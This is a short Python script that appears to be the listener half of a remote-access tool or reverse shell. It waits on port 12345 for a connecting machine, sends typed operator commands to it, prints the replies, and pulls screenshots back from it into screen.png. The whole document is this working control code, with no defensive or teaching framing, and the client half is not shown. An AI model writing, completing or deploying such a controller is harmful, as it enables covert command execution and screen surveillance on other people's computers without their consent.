import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = ""
port = 12345

s.bind((host, port))
s.listen()

conn, addr = s.accept()
print(f"[!]  connected : {addr}")

while True:
    message = input("CMD > ")
    if message == "":
        print("command entered...")
    elif message == "screenshot":
        conn.send(message.encode("utf-8"))
        with open("screen.png", "wb") as img:
            len_img = int(conn.recv(1024).decode())
            dl_data = 0
            while dl_data < len_img:
                rec = conn.recv(1024)
                img.write(rec)
                dl_data += len(rec)
    else:
        conn.send(message.encode("utf-8"))
        data = conn.recv(1024)
        if data.decode("utf-8") == "close":
            conn.close()
            break
        print(data.decode("utf-8"))